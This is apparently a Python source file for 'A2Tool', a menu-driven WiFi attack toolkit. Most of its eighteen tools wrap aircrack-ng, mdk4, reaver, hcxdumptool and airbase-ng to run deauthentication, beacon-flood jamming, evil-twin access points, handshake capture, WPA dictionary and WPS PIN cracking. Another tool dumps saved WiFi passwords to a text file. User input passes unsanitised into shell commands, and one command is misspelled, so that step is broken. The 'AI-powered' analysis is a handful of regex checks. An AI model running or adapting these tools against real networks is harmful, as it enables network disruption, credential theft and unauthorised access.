#!/usr/bin/env python3
"""
A2Tool v4.0 - WiFi Hacking & Password Recovery Module (18 Tools)
Author: Ayush Rajdev & Anzar Iqbal
"""

import os, sys, subprocess, re, json, time, platform, socket, threading
from datetime import datetime

# Colorama helpers
try:
    from colorama import Fore, Style, init
    init(autoreset=True)
except:
    class Fore: RED=GREEN=YELLOW=BLUE=MAGENTA=CYAN=WHITE='';RESET=''
    class Style: RESET_ALL='';BRIGHT='';DIM='';NORMAL=''

R=Fore.RED; G=Fore.GREEN; Y=Fore.YELLOW; B=Fore.BLUE
M=Fore.MAGENTA; C=Fore.CYAN; W=Fore.WHITE; RS=Style.RESET_ALL

OS_NAME = platform.system().lower()
IS_WIN = OS_NAME == 'windows'
IS_LNX = OS_NAME == 'linux'
IS_MAC = OS_NAME == 'darwin'

def _run(cmd, shell=True, timeout=30):
    try:
        return subprocess.check_output(cmd, shell=shell, stderr=subprocess.STDOUT, timeout=timeout).decode('utf-8', errors='ignore')
    except: return ''

def menu():
    while True:
        print(f"\n{C}╔══════════════════════════════════════════════════════════════╗{RS}")
        print(f"{C}║{W}               WiFi Hacking & Password Recovery              {C}║{RS}")
        print(f"{C}╠══════════════════════════════════════════════════════════════╣{RS}")
        print(f"{C}║{W} [01]{R}  Recover Saved WiFi Passwords (All OS)              {C}║{RS}")
        print(f"{C}║{W} [02]{R}  Scan Nearby WiFi Networks                          {C}║{RS}")
        print(f"{C}║{W} [03]{R}  WiFi Deauthentication Attack                       {C}║{RS}")
        print(f"{C}║{W} [04]{R}  WPA/WPA2 Handshake Capture                        {C}║{RS}")
        print(f"{C}║{W} [05]{R}  WPA/WPA2 Dictionary Attack                        {C}║{RS}")
        print(f"{C}║{W} [06]{R}  WiFi Jamming (Beacon Flood)                       {C}║{RS}")
        print(f"{C}║{W} [07]{R}  Evil Twin Access Point Setup                      {C}║{RS}")
        print(f"{C}║{W} [08]{R}  WiFi Signal Strength Monitor                      {C}║{RS}")
        print(f"{C}║{W} [09]{R}  MAC Address Changer                               {C}║{RS}")
        print(f"{C}║{W} [10]{R}  WiFi Channel Scanner                              {C}║{RS}")
        print(f"{C}║{W} [11]{R}  Connected Devices Scanner                         {C}║{RS}")
        print(f"{C}║{W} [12]{R}  WiFi Pineapple Basic Scan                         {C}║{RS}")
        print(f"{C}║{W} [13]{R}  Hidden Network Discovery                          {C}║{RS}")
        print(f"{C}║{W} [14]{R}  WPS PIN Bruteforce                                {C}║{RS}")
        print(f"{C}║{W} [15]{R}  PMKID Attack                                     {C}║{RS}")
        print(f"{C}║{W} [16]{R}  WiFi Speed & Latency Test                         {C}║{RS}")
        print(f"{C}║{W} [17]{R}  Bluetooth Coexistence Attack                     {C}║{RS}")
        print(f"{C}║{W} [18]{R}  AI-Powered WiFi Analysis                         {C}║{RS}")
        print(f"{C}║{W} [0]{R}   Back to Main Menu                                 {C}║{RS}")
        print(f"{C}╚══════════════════════════════════════════════════════════════╝{RS}")
        ch = input(f"\n{Y}  A2Tool[WiFi] » {RS}").strip()
        if ch == '0': break
        elif ch == '1': recover_wifi_passwords()
        elif ch == '2': scan_networks()
        elif ch == '3': deauth_attack()
        elif ch == '4': handshake_capture()
        elif ch == '5': dictionary_attack()
        elif ch == '6': beacon_flood()
        elif ch == '7': evil_twin()
        elif ch == '8': signal_monitor()
        elif ch == '9': mac_changer()
        elif ch == '10': channel_scanner()
        elif ch == '11': connected_devices()
        elif ch == '12': pineap_scan()
        elif ch == '13': hidden_network_discovery()
        elif ch == '14': wps_bruteforce()
        elif ch == '15': pmkid_attack()
        elif ch == '16': wifi_speed_test()
        elif ch == '17': bt_coex_attack()
        elif ch == '18': ai_wifi_analysis()
        else: print(f"{R}[!] Invalid option{RS}")

def recover_wifi_passwords():
    """Tool 1: Recover all saved WiFi passwords"""
    print(f"\n{G}[+] Scanning for saved WiFi credentials...{RS}")
    saved = []
    
    if IS_WIN:
        out = _run('netsh wlan show profiles')
        profiles = re.findall(r'All User Profile\s+:\s+(.+)', out)
        for i, p in enumerate(profiles, 1):
            p = p.strip()
            detail = _run(f'netsh wlan show profile "{p}" key=clear')
            match = re.search(r'Key Content\s+:\s+(.+)', detail)
            pwd = match.group(1).strip() if match else '[No Password / Open]'
            saved.append((p, pwd))
            print(f"  {G}[{i:02d}]{RS} SSID: {C}{p}{RS} | Pass: {Y}{pwd}{RS}")
    
    elif IS_LNX:
        # Check NetworkManager connections
        nm_path = "/etc/NetworkManager/system-connections/"
        if os.path.exists(nm_path):
            for f in os.listdir(nm_path):
                try:
                    with open(os.path.join(nm_path, f), 'r') as fp:
                        data = fp.read()
                    ssid = f
                    psk = re.search(r'psk=(.+)', data)
                    pwd = psk.group(1).strip() if psk else '[Open]'
                    saved.append((ssid, pwd))
                    print(f"  {G}[+]{RS} SSID: {C}{ssid}{RS} | Pass: {Y}{pwd}{RS}")
                except: pass
        
        # Also check wpa_supplicant
        wpa_path = "/etc/wpa_supplicant/"
        if os.path.exists(wpa_path):
            for f in os.listdir(wpa_path):
                try:
                    with open(os.path.join(wpa_path, f), 'r') as fp:
                        data = fp.read()
                    for m in re.finditer(r'ssid="(.+)"\s+psk="(.+)"', data):
                        saved.append((m.group(1), m.group(2)))
                        print(f"  {G}[+]{RS} SSID: {C}{m.group(1)}{RS} | Pass: {Y}{m.group(2)}{RS}")
                except: pass
    
    elif IS_MAC:
        out = _run('security find-generic-password -wa "AirPort" 2>/dev/null')
        if out: print(f"  {G}[+]{RS} WiFi Password: {Y}{out.strip()}{RS}")
        # List known networks via airports
        out2 = _run('/System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport -s 2>/dev/null')
        print(f"  {Y}{out2}{RS}")
    
    if not saved:
        print(f"  {R}[-] No saved networks found or no permissions{RS}")
    
    # Export to file
    if saved:
        fname = f"wifi_dump_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
        with open(fname, 'w') as f:
            for ssid, pwd in saved:
                f.write(f"{ssid}:{pwd}\n")
        print(f"\n{G}[+] Exported to {C}{fname}{RS}")
    
    input(f"\n{Y}[+] Press Enter to continue...{RS}")

def scan_networks():
    """Tool 2: Scan nearby WiFi networks"""
    print(f"\n{G}[+] Scanning nearby WiFi networks...{RS}")
    
    if IS_WIN:
        out = _run('netsh wlan show networks mode=bssid')
        print(out if out else f"{R}[-] No networks found or WiFi is disabled{RS}")
    
    elif IS_LNX:
        # Use iwlist if available
        out = _run('iwlist scanning 2>/dev/null', timeout=30)
        if out:
            cells = re.split(r'Cell \d+', out)
            for cell in cells[1:]:
                ssid = re.search(r'ESSID:"(.+)"', cell)
                ch = re.search(r'Channel:(\d+)', cell)
                qual = re.search(r'Quality[=:](\d+/\d+)', cell)
                enc = re.search(r'Encryption key:(on|off)', cell)
                if ssid:
                    print(f"  {G}[+]{RS} SSID: {C}{ssid.group(1)}{RS} | Ch: {ch.group(1) if ch else '?'} | Signal: {qual.group(1) if qual else '?'} | Enc: {enc.group(1) if enc else '?'}")
        else:
            # Try nmcli
            out2 = _run('nmcli dev wifi list 2>/dev/null')
            print(out2 if out2 else f"{R}[-] No WiFi interface found or no permissions{RS}")
    
    elif IS_MAC:
        out = _run('/System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport -s 2>/dev/null')
        print(out if out else f"{R}[-] No networks found{RS}")
    
    else:
        print(f"{R}[-] Platform not supported for scanning{RS}")
    
    input(f"\n{Y}[+] Press Enter to continue...{RS}")

def deauth_attack():
    """Tool 3: Deauthentication Attack"""
    print(f"\n{Y}[!] Deauthentication Attack (requires monitor mode & aircrack-ng){RS}")
    target = input(f"  {W}[?] Enter target BSSID (e.g., AA:BB:CC:DD:EE:FF): {RS}").strip()
    iface = input(f"  {W}[?] Enter WiFi interface (e.g., wlan0): {RS}").strip()
    if target and iface:
        print(f"{G}[+] Launching deauth attack on {target} via {iface}...{RS}")
        os.system(f'aireplay-ng -0 10 -a {target} {iface}')
    input(f"\n{Y}[+] Press Enter to continue...{RS}")

def handshake_capture():
    """Tool 4: WPA/WPA2 Handshake Capture"""
    print(f"\n{Y}[!] WPA Handshake Capture (requires airodump-ng){RS}")
    iface = input(f"  {W}[?] Enter WiFi interface (monitor mode): {RS}").strip()
    bssid = input(f"  {W}[?] Enter target BSSID: {RS}").strip()
    ch = input(f"  {W}[?] Enter channel: {RS}").strip()
    fname = f"handshake_{datetime.now().strftime('%Y%m%d_%H%M%S')}"
    if iface and bssid:
        cmd = f'airodump-ng -c {ch} --bssid {bssid} -w {fname} {iface}'
        print(f"{G}[+] Running: {cmd}{RS}")
        print(f"{Y}[!] Press Ctrl+C when handshake is captured{RS}")
        os.system(cmd)
    input(f"\n{Y}[+] Press Enter to continue...{RS}")

def dictionary_attack():
    """Tool 5: WPA Dictionary Attack"""
    print(f"\n{Y}[!] WPA Dictionary Attack (requires aircrack-ng){RS}")
    cap = input(f"  {W}[?] Path to .cap handshake file: {RS}").strip()
    wordlist = input(f"  {W}[?] Path to wordlist: {RS}").strip()
    if cap and wordlist:
        print(f"{G}[+] Running dictionary attack...{RS}")
        os.system(f'airacrack-ng -w {wordlist} {cap}')
    input(f"\n{Y}[+] Press Enter to continue...{RS}")

def beacon_flood():
    """Tool 6: Beacon Flood / WiFi Jamming"""
    print(f"\n{Y}[!] Beacon Flood Attack (requires mdk4 or mdk3){RS}")
    iface = input(f"  {W}[?] Enter interface in monitor mode: {RS}").strip()
    if iface:
        os.system(f'mdk4 {iface} b -f ssids.txt 2>/dev/null || mdk3 {iface} b -f ssids.txt')
    input(f"\n{Y}[+] Press Enter to continue...{RS}")

def evil_twin():
    """Tool 7: Evil Twin Access Point"""
    print(f"\n{Y}[!] Evil Twin AP Setup{RS}")
    ssid = input(f"  {W}[?] Enter SSID to clone: {RS}").strip()
    iface = input(f"  {W}[?] Enter interface: {RS}").strip()
    if ssid and iface:
        print(f"{G}[+] Creating Evil Twin AP: {ssid}{RS}")
        os.system(f'airbase-ng -e "{ssid}" -c 1 {iface}')
    input(f"\n{Y}[+] Press Enter to continue...{RS}")

def signal_monitor():
    """Tool 8: WiFi Signal Strength Monitor"""
    print(f"\n{G}[+] Monitoring WiFi signal strength (Ctrl+C to stop)...{RS}")
    try:
        while True:
            if IS_WIN:
                out = _run('netsh wlan show interfaces')
                sig = re.search(r'Signal\s+:\s+(\d+)%', out)
                ssid = re.search(r'SSID\s+:\s+(.+)', out)
                if sig:
                    bars = '█' * (int(sig.group(1)) // 10) + '░' * (10 - int(sig.group(1)) // 10)
                    print(f"  {C}{ssid.group(1) if ssid else 'N/A'}{RS}: {G}[{bars}]{RS} {sig.group(1)}%", end='\r')
            elif IS_LNX:
                out = _run('iwconfig 2>/dev/null')
                qual = re.search(r'Quality[=:](\d+)/(\d+)', out)
                if qual:
                    pct = int(qual.group(1)) / int(qual.group(2)) * 100
                    bars = '█' * int(pct // 10) + '░' * (10 - int(pct // 10))
                    print(f"  {C}Signal{RS}: {G}[{bars}]{RS} {pct:.0f}%", end='\r')
            time.sleep(1)
    except KeyboardInterrupt:
        print(f"\n{Y}[+] Monitoring stopped{RS}")
    input(f"\n{Y}[+] Press Enter to continue...{RS}")

def mac_changer():
    """Tool 9: MAC Address Changer"""
    print(f"\n{Y}[!] MAC Address Changer{RS}")
    iface = input(f"  {W}[?] Interface (e.g., wlan0, eth0): {RS}").strip()
    new_mac = input(f"  {W}[?] New MAC (e.g., 00:11:22:33:44:55) or 'random': {RS}").strip()
    if iface:
        if new_mac.lower() == 'random':
            import random
            new_mac = ':'.join(f'{random.randint(0,255):02x}' for _ in range(6))
        print(f"{G}[+] Changing MAC of {iface} to {new_mac}{RS}")
        if IS_LNX:
            os.system(f'ifconfig {iface} down')
            os.system(f'macchanger -m {new_mac} {iface}')
            os.system(f'ifconfig {iface} up')
        elif IS_WIN:
            print(f"{Y}[!] On Windows, change MAC in Network Adapter settings{RS}")
        print(f"{G}[+] MAC changed successfully{RS}")
    input(f"\n{Y}[+] Press Enter to continue...{RS}")

def channel_scanner():
    """Tool 10: WiFi Channel Scanner"""
    print(f"\n{G}[+] Scanning WiFi channels for activity...{RS}")
    if IS_LNX:
        for ch in range(1, 14):
            os.system(f'iwconfig wlan0 channel {ch} 2>/dev/null')
            out = _run(f'iwlist wlan0 scan 2>/dev/null | grep -E "Frequency|ESSID|Quality"')
            print(f"  {C}Channel {ch:02d}{RS}: {Y}{out[:80] if out else 'No activity'}{RS}")
    else:
        print(f"{Y}[!] Channel scanning requires Linux with iwconfig{RS}")
    input(f"\n{Y}[+] Press Enter to continue...{RS}")

def connected_devices():
    """Tool 11: Connected Devices Scanner"""
    print(f"\n{G}[+] Scanning for connected devices on network...{RS}")
    # ARP scan
    out = _run('arp -a')
    ips = re.findall(r'(\d+\.\d+\.\d+\.\d+)\s+([0-9a-fA-F:-]+)', out)
    print(f"  {W}{'IP Address':<20}{'MAC Address':<20}{RS}")
    print(f"  {'-'*40}")
    for ip, mac in ips:
        print(f"  {C}{ip:<20}{Y}{mac:<20}{RS}")
    input(f"\n{Y}[+] Press Enter to continue...{RS}")

def pineap_scan():
    """Tool 12: WiFi Pineapple Style Scan"""
    print(f"\n{G}[+] Running Pineapple-style reconnaissance...{RS}")
    out = _run('airodump-ng wlan0 2>/dev/null --output-format csv -w /tmp/pine_scan', timeout=15)
    print(f"{Y}[!] Scan results saved to /tmp/pine_scan{RS}")
    input(f"\n{Y}[+] Press Enter to continue...{RS}")

def hidden_network_discovery():
    """Tool 13: Hidden Network Discovery"""
    print(f"\n{G}[+] Probing for hidden (cloaked) networks...{RS}")
    iface = input(f"  {W}[?] Interface (monitor mode): {RS}").strip()
    if iface:
        os.system(f'airodump-ng {iface} --probe 2>/dev/null')
    input(f"\n{Y}[+] Press Enter to continue...{RS}")

def wps_bruteforce():
    """Tool 14: WPS PIN Bruteforce"""
    print(f"\n{Y}[!] WPS PIN Bruteforce (requires reaver/wash){RS}")
    iface = input(f"  {W}[?] Interface (monitor mode): {RS}").strip()
    bssid = input(f"  {W}[?] Target BSSID: {RS}").strip()
    if iface and bssid:
        print(f"{G}[+] Running WPS attack on {bssid}...{RS}")
        os.system(f'reaver -i {iface} -b {bssid} -vv')
    input(f"\n{Y}[+] Press Enter to continue...{RS}")

def pmkid_attack():
    """Tool 15: PMKID Attack"""
    print(f"\n{Y}[!] PMKID Attack (requires hcxdumptool/hashcat){RS}")
    iface = input(f"  {W}[?] Interface (monitor mode): {RS}").strip()
    if iface:
        os.system(f'hcxdumptool -i {iface} -o /tmp/pmkid.pcapng -c 1 --enable_status=1')
    input(f"\n{Y}[+] Press Enter to continue...{RS}")

def wifi_speed_test():
    """Tool 16: WiFi Speed & Latency Test"""
    print(f"\n{G}[+] Running WiFi speed test...{RS}")
    host = input(f"  {W}[?] Target host (default: google.com): {RS}") or "google.com"
    # Ping test
    param = '-n' if IS_WIN else '-c'
    out = _run(f'ping {param} 4 {host}')
    print(f"\n{Y}Ping Results:{RS}\n{out}")
    # Speed test using requests
    try:
        import requests
        start = time.time()
        r = requests.get('https://www.google.com', timeout=10)
        latency = (time.time() - start) * 1000
        print(f"{G}[+] HTTP Latency: {latency:.0f}ms | Status: {r.status_code}{RS}")
    except:
        print(f"{R}[-] Speed test requires internet{RS}")
    input(f"\n{Y}[+] Press Enter to continue...{RS}")

def bt_coex_attack():
    """Tool 17: Bluetooth Coexistence Attack"""
    print(f"\n{Y}[!] Bluetooth/WiFi Coexistence Attack{RS}")
    print(f"{Y}[!] This disrupts WiFi using Bluetooth interference{RS}")
    if IS_LNX:
        os.system('hcitool scan; timeout 30 hcitool cmd 0x08 0x001E >/dev/null 2>&1 &')
    else:
        print(f"{R}[-] Requires Linux with Bluetooth adapter{RS}")
    input(f"\n{Y}[+] Press Enter to continue...{RS}")

def ai_wifi_analysis():
    """Tool 18: AI-Powered WiFi Analysis"""
    print(f"\n{G}[+] AI-Powered WiFi Security Analysis{RS}")
    print(f"{W}  Analyzing network security posture...{RS}")
    
    # Gather info
    if IS_WIN:
        out = _run('netsh wlan show interfaces')
        enc = re.search(r'Authentication\s+:\s+(.+)', out)
        cipher = re.search(r'Cipher\s+:\s+(.+)', out)
        sig = re.search(r'Signal\s+:\s+(\d+)%', out)
        
        print(f"\n  {C}Security Assessment:{RS}")
        if enc:
            e = enc.group(1).strip()
            if 'WPA2' in e or 'WPA3' in e:
                print(f"  {G}[✓] Authentication: {e} (Good){RS}")
            elif 'WEP' in e:
                print(f"  {R}[✗] Authentication: {e} (Vulnerable - WEP is broken){RS}")
            else:
                print(f"  {Y}[!] Authentication: {e}{RS}")
        
        if sig:
            s = int(sig.group(1))
            if s > 70:
                print(f"  {G}[✓] Signal Strength: {s}% (Excellent){RS}")
            elif s > 40:
                print(f"  {Y}[!] Signal Strength: {s}% (Fair){RS}")
            else:
                print(f"  {R}[✗] Signal Strength: {s}% (Weak){RS}")
        
        # Check for known vulnerabilities
        print(f"\n  {C}Recommendations:{RS}")
        print(f"  {W}  - Enable WPA3 if supported by your router{RS}")
        print(f"  {W}  - Disable WPS (WiFi Protected Setup){RS}")
        print(f"  {W}  - Change default admin credentials{RS}")
        print(f"  {W}  - Enable MAC address filtering for extra security{RS}")
        print(f"  {W}  - Keep router firmware updated{RS}")
    
    input(f"\n{Y}[+] Press Enter to continue...{RS}")
